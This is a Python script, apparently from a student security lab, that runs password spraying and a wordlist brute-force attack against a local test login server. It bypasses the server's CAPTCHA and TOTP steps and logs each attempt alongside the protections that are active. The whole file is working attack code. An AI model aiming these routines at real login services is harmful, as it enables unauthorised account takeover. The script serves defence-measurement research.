import requests
import time
import csv
import json
import pyotp
import os
import config
from datetime import datetime
from config import GROUP_SEED, HASH_MODE
import sys

# אם קיבלנו שם קובץ מה-orchestrator, נשתמש בו. אם לא, נשתמש בברירת מחדל.
if len(sys.argv) > 1:
    LOG_FILE = sys.argv[1]
else:
    LOG_FILE = "attack_research_results.csv"

# הגדרות כתובות השרת
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TOTP_URL = f"{BASE_URL}/login_totp"
ADMIN_CAPTCHA_URL = f"{BASE_URL}/admin/get_captcha_token"


def log_attempt(username, result, latency, attack_type):
    """תיעוד הנסיונות לקובץ CSV עם פירוט הגנות אקטיביות"""

    file_exists = os.path.isfile(LOG_FILE)

    # 1. שליפת רשימת ההגנות שמוגדרות כ-True בתוך PROTECTION_FLAGS
    active_protections = [name for name, status in config.PROTECTION_FLAGS.items() if status]

    # 2. יצירת מחרוזת טקסט למילוי בעמודה (למשל: "captcha, lockout")
    protections_display = ", ".join(active_protections) if active_protections else "None"

    with open(LOG_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)

        # יצירת כותרות אם הקובץ חדש
        if not file_exists:
            writer.writerow([
                "timestamp",
                "username",
                "hash_mode",
                "active_protections",  # העמודה החדשה שביקשת
                "attack_type",
                "result",
                "latency_ms"
            ])

        # כתיבת שורת הנתונים
        writer.writerow([
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            username,
            config.HASH_MODE,
            protections_display,
            attack_type,
            "success" if result else "failed",
            round(latency, 2)
        ])

def get_captcha_token():
    """משיכת token חדש מהשרת בכל פעם שנחסמים"""
    try:
        response = requests.get(f"{ADMIN_CAPTCHA_URL}?group_seed={GROUP_SEED}")
        return response.json().get("captcha_token") if response.status_code == 200 else None
    except:
        return None


def perform_single_login(username, password, totp_secret, attack_type):
    """ביצוע תהליך האימות המלא מול השרת"""
    start_time = time.time()
    payload = {"username": username, "password": password}
    try:
        response = requests.post(LOGIN_URL, json=payload)
        # עקיפת CAPTCHA
        if response.status_code == 403 and "captcha_required" in response.text:
            token = get_captcha_token()
            if token:
                payload["captcha_token"] = token
                response = requests.post(LOGIN_URL, json=payload)
        # עקיפת TOTP
        if response.status_code == 200 and "totp_required" in response.text:
            token = pyotp.TOTP(totp_secret).now()
            response = requests.post(TOTP_URL, json={"username": username, "totp_token": token})

        latency = (time.time() - start_time) * 1000
        success = (response.status_code == 200)
        log_attempt(username, success, latency, attack_type)
        return success
    except Exception as e:
        print(f"Error: {e}")
        return False


def run_password_spraying():
    """תקיפה רוחבית על כל המשתמשים"""
    print(f"\n[!] Starting Password Spraying ({HASH_MODE})...")
    with open("users.json", "r") as f:
        users = json.load(f)
    common_pwds = ["123456", "password", str(GROUP_SEED)]
    for pwd in common_pwds:
        for user in users:
            perform_single_login(user['username'], pwd, user['totp_secret'], "password_spraying")
            time.sleep(0.1)


def run_brute_force_from_file(target_username, filename="wordlist.txt"):
    """תקיפת מילון מקובץ חיצוני עבור משתמש אחד"""
    print(f"\n[!] Starting Brute Force from {filename} on {target_username}...")
    if not os.path.exists(filename):
        print(f"Error: {filename} not found!")
        return

    with open("users.json", "r") as f:
        users = json.load(f)
    user_info = next((u for u in users if u['username'] == target_username), None)
    if not user_info: return

    with open(filename, "r") as f:
        for line in f:
            pwd = line.strip()  # ניקוי רווחים וירידת שורה
            if not pwd: continue
            if perform_single_login(target_username, pwd, user_info['totp_secret'], "brute_force"):
                print(f"--- SUCCESS: Password found: {pwd} ---")
                break


if __name__ == "__main__":
    run_password_spraying()
    # כאן מפעילים את המילון החיצוני על משתמש ספציפי
    run_brute_force_from_file("weak_user_0", "wordlist.txt")